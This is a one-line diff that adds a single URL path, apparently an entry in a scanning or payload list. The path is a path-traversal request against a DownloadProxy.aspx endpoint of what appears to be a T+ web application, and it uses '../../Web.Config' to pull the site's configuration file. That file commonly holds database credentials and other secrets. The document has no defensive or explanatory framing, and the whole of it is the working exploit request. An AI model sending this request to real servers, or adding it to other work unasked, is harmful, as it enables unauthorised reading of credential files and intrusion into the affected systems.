@@ -1,0 +1,1 @@
+/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
